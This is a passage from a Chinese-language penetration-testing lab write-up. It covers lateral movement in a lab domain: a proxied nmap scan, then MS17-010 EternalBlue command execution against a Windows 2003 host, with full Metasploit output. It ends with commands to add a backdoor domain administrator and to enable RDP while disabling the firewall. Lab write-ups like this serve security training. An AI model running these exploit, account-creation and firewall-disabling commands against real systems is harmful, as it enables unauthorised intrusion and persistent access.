<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending NetBIOS requests to <span class="token number">192.168</span>.52.0-<span class="token operator">&gt;</span><span class="token number">192.168</span>.52.255 <span class="token punctuation">(</span><span class="token number">256</span> hosts<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.138 <span class="token punctuation">[</span>OWA<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>OWA, GOD<span class="token punctuation">)</span> Addresses:<span class="token punctuation">(</span><span class="token number">192.168</span>.52.138<span class="token punctuation">)</span> Mac:00:0c:29:c1:33:d6 Virtual Machine:VMWare
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141 <span class="token punctuation">[</span>ROOT-TVI862UBEH<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>ROOT-TVI862UBEH, GOD, SNTL_ROOT-TVI86<span class="token punctuation">)</span> Addresses:<span class="token punctuation">(</span><span class="token number">192.168</span>.52.141<span class="token punctuation">)</span> Mac:00:0c:29:1c:44:8e Virtual Machine:VMWare
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.143 <span class="token punctuation">[</span>STU1<span class="token punctuation">]</span> OS:Windows Names:<span class="token punctuation">(</span>STU1, GOD, __MSBROWSE__<span class="token punctuation">)</span>  Mac:00:0c:29:bd:35:01 Virtual Machine:VMWare
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h3 id="法二-cs-2"><a href="#法二-cs-2" class="header-anchor">#</a> 法二：CS</h3> <blockquote><p>PS. 下面internal拿到192.254是不正常的</p></blockquote> <p><img src="/assets/img/image-20220815013954624.0e651e32.png" alt="image-20220815013954624"></p> <p>经检查，发现是网卡识别错误，需要将其他无用网卡禁用后才能拿到正确的internal IP</p> <p><img src="/assets/img/image-20220815151257133.a29ba6dc.png" alt="image-20220815151257133"></p> <p>怎么探测都没反应，命令不执行</p> <p><img src="/assets/img/image-20220815151634275.1722276a.png" alt="image-20220815151634275"></p> <p>发现是CS的bug，自己敲一遍就行了</p> <p><img src="/assets/img/image-20220815151840765.37a2d623.png" alt="image-20220815151840765"></p> <p>回到列表视图，扫端口</p> <p><img src="/assets/img/image-20220815152357885.a7d476c1.png" alt="image-20220815152357885"></p> <p><s>又出Bug了，CS识别不到目标机所在的内网ip段</s></p> <p>点开之后要等一段时间才能扫到</p> <p><img src="/assets/img/image-20220815155618348.a1c25d7b.png" alt="image-20220815155618348"></p> <p><img src="/assets/img/image-20220815155810801.50abe6a8.png" alt="image-20220815155810801"></p> <h2 id="横向移动"><a href="#横向移动" class="header-anchor">#</a> 横向移动</h2> <p>扫一下跟目前被攻击的机器(Win7)的内网里的另一台机器(Win2k3)开了哪些端口</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> proxychains4 nmap -p <span class="token number">1</span>-1000 -Pn -sT <span class="token number">192.168</span>.52.141
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> exec: proxychains4 nmap -p <span class="token number">1</span>-1000 -Pn -sT <span class="token number">192.168</span>.52.141

<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains4.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.16</span>
Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-08-15 04:18 EDT
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:111 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:143 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:135  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:139  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:53 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:256 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:445  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:199 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:21  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:995 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:25 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:993 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:1080  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.52.141:22 <span class="token operator">&lt;</span>--socket error or timeout<span class="token operator">!</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>发现445端口SMB，看下版本</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/scanner/smb/smb_version
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 

Module options <span class="token punctuation">(</span>auxiliary/scanner/smb/smb_version<span class="token punctuation">)</span>:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  <span class="token number">1</span>                <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per <span class="token function">host</span><span class="token punctuation">)</span>

msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.141
rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.52.141
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - SMB Detected <span class="token punctuation">(</span>versions:1<span class="token punctuation">)</span> <span class="token punctuation">(</span>preferred dialect:<span class="token punctuation">)</span> <span class="token punctuation">(</span>signatures:optional<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -   Host is running Windows <span class="token number">2003</span> <span class="token punctuation">(</span>build:3790<span class="token punctuation">)</span> <span class="token punctuation">(</span>name:ROOT-TVI862UBEH<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:GOD<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:       - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>永恒之蓝打他，跑个ipconfig。</p> <blockquote><p>use auxiliary/admin/smb/ms17_010_command</p> <p>set rhosts 192.168.52.141</p> <p>set command 命令</p> <p>run</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> search ms17-010

Matching Modules
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   <span class="token comment">#  Name                                      Disclosure Date  Rank     Check  Description</span>
   -  ----                                      ---------------  ----     -----  -----------
   <span class="token number">0</span>  exploit/windows/smb/ms17_010_eternalblue  <span class="token number">2017</span>-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   <span class="token number">1</span>  exploit/windows/smb/ms17_010_psexec       <span class="token number">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   <span class="token number">2</span>  auxiliary/admin/smb/ms17_010_command      <span class="token number">2017</span>-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   <span class="token number">3</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   <span class="token number">4</span>  exploit/windows/smb/smb_doublepulsar_rce  <span class="token number">2017</span>-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info <span class="token number">4</span>, use <span class="token number">4</span> or use exploit/windows/smb/smb_doublepulsar_rce

msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use <span class="token number">2</span>
msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 

Module options <span class="token punctuation">(</span>auxiliary/admin/smb/ms17_010_command<span class="token punctuation">)</span>:

   Name                  Current Setting                     Required  Description
   ----                  ---------------                     --------  -----------
   COMMAND               net group <span class="token string">&quot;Domain Admins&quot;</span> /domain   <span class="token function">yes</span>       The <span class="token builtin class-name">command</span> you want to execute on the remote <span class="token function">host</span>
   DBGTRACE              <span class="token boolean">false</span>                               <span class="token function">yes</span>       Show extra debug trace info
   LEAKATTEMPTS          <span class="token number">99</span>                                  <span class="token function">yes</span>       How many <span class="token builtin class-name">times</span> to try to leak transaction
   NAMEDPIPE                                                 no        A named pipe that can be connected to <span class="token punctuation">(</span>leave blank <span class="token keyword">for</span> auto<span class="token punctuation">)</span>
   NAMED_PIPES           /usr/share/metasploit-framework/da  <span class="token function">yes</span>       List of named pipes to check
                         ta/wordlists/named_pipes.txt
   RHOSTS                                                    <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit
                                                                       -framework/wiki/Using-Metasploit
   RPORT                 <span class="token number">445</span>                                 <span class="token function">yes</span>       The Target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SERVICE_DESCRIPTION                                       no        Service description to to be used on target <span class="token keyword">for</span> pretty listi
                                                                       ng
   SERVICE_DISPLAY_NAME                                      no        The <span class="token function">service</span> display name
   SERVICE_NAME                                              no        The <span class="token function">service</span> name
   SMBDomain             <span class="token builtin class-name">.</span>                                   no        The Windows domain to use <span class="token keyword">for</span> authentication
   SMBPass                                                   no        The password <span class="token keyword">for</span> the specified username
   SMBSHARE              C$                                  <span class="token function">yes</span>       The name of a writeable share on the server
   SMBUser                                                   no        The username to authenticate as
   THREADS               <span class="token number">1</span>                                   <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per <span class="token function">host</span><span class="token punctuation">)</span>
   WINPATH               WINDOWS                             <span class="token function">yes</span>       The name of the remote Windows directory

msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.141
rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.52.141
msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> <span class="token builtin class-name">command</span> ipconfig
<span class="token builtin class-name">command</span> <span class="token operator">=</span><span class="token operator">&gt;</span> ipconfig
msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Target OS: Windows Server <span class="token number">2003</span> <span class="token number">3790</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Filling barrel with fish<span class="token punctuation">..</span>. <span class="token keyword">done</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - <span class="token operator">&lt;</span>---------------- <span class="token operator">|</span> Entering Danger Zone <span class="token operator">|</span> ----------------<span class="token operator">&gt;</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -     <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Preparing dynamite<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -             Trying stick <span class="token number">1</span> <span class="token punctuation">(</span>x64<span class="token punctuation">)</span><span class="token punctuation">..</span>.Miss
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -             <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying stick <span class="token number">2</span> <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">..</span>.Boom<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -     <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully Leaked Transaction<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    -     <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully caught Fish-in-a-barrel
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - <span class="token operator">&lt;</span>---------------- <span class="token operator">|</span> Leaving Danger Zone <span class="token operator">|</span> ----------------<span class="token operator">&gt;</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Reading from CONNECTION struct at: 0x87a26cc8
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Built a write-what-where primitive<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Overwrite complete<span class="token punctuation">..</span>. SYSTEM session obtained<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Service start timed out, OK <span class="token keyword">if</span> running a <span class="token builtin class-name">command</span> or non-service executable<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Getting the <span class="token builtin class-name">command</span> output<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Executing cleanup<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Cleanup was successful
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Command completed successfully<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Output <span class="token keyword">for</span> <span class="token string">&quot;ipconfig&quot;</span><span class="token builtin class-name">:</span>


Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> 
   IP Address. <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.52.141
   Subnet Mask <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">255.255</span>.255.0
   Default Gateway <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.52.2


<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.52.141:445    - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br></div></div><p>照理来说，前面创建后门的时候创建的perry用户是再GOD下的，所以这里应该也可以不建，但保险起见也可以再建一次</p> <blockquote><p>net user /add perry Aa123456 /domain</p> <p>net localgroup administrators /add god\perry</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>msf6 auxiliary(admin/smb/ms17_010_command) &gt; set command net user /add perry Aa123456 /domain
command =&gt; net user /add perry Aa123456 /domain
msf6 auxiliary(admin/smb/ms17_010_command) &gt; run

[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790
[*] 192.168.52.141:445    - Filling barrel with fish... done
[*] 192.168.52.141:445    - &lt;---------------- | Entering Danger Zone | ----------------&gt;
[*] 192.168.52.141:445    -     [*] Preparing dynamite...
[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss
[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom!
[*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction!
[*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel
[*] 192.168.52.141:445    - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x87a02ae0
[*] 192.168.52.141:445    - Built a write-what-where primitive...
[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained!
[+] 192.168.52.141:445    - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.52.141:445    - Getting the command output...
[*] 192.168.52.141:445    - Executing cleanup...
[+] 192.168.52.141:445    - Cleanup was successful
[+] 192.168.52.141:445    - Command completed successfully!
[*] 192.168.52.141:445    - Output for &quot;net user /add perry Aa123456 /domain&quot;:

The request will be processed at a domain controller for domain god.org.



[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>msf6 auxiliary(admin/smb/ms17_010_command) &gt; set command net localgroup administrators /add god\\perry
command =&gt; net localgroup administrators /add god\perry
msf6 auxiliary(admin/smb/ms17_010_command) &gt; run

[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790
[*] 192.168.52.141:445    - Filling barrel with fish... done
[*] 192.168.52.141:445    - &lt;---------------- | Entering Danger Zone | ----------------&gt;
[*] 192.168.52.141:445    -     [*] Preparing dynamite...
[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss
[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom!
[*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction!
[*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel
[*] 192.168.52.141:445    - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x87a26cc8
[*] 192.168.52.141:445    - Built a write-what-where primitive...
[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained!
[+] 192.168.52.141:445    - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.52.141:445    - Getting the command output...
[*] 192.168.52.141:445    - Executing cleanup...
[+] 192.168.52.141:445    - Cleanup was successful
[+] 192.168.52.141:445    - Command completed successfully!
[*] 192.168.52.141:445    - Output for &quot;net localgroup administrators /add god\perry&quot;:

The command completed successfully.



[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><p>启用远程桌面</p> <blockquote><p>netstat -ano | findstr &quot;3389&quot;						# 查看端口3389是否开启
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber		# 查看远程端口
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f	# 开启3389端口
netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow	# 允许 3389 端口放行
netsh firewall set opmode disable					# Windows Server 2003 系统及之前版本
